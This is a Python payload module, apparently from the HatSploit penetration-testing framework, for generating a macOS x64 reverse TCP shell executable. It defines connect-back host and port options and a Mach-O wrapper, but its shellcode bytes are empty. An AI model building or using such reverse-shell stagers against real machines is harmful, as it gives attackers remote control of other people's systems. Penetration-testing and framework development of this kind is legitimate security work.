#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.payload.payload import PayloadGenerator
from utils.tcp.tcp import TCPClient
from utils.string.string import StringTools


class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Shell Reverse TCP",
        'Payload': "macos/x64/shell_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell reverse TCP payload for macOS x64.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "macho",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        local_host, local_port, executable_format = self.parse_options(self.options)

        local_host = self.host_to_bytes(local_host)
        local_port = self.port_to_bytes(local_port)

        if executable_format not in self.formats.keys():
            self.output_error("Invalid executable format!")
            return

        self.output_process("Generating shellcode...")
        shellcode = (
            b""
        )

        self.output_process("Generating payload...")
        payload = self.generate(executable_format, 'x64', shellcode)

        return payload
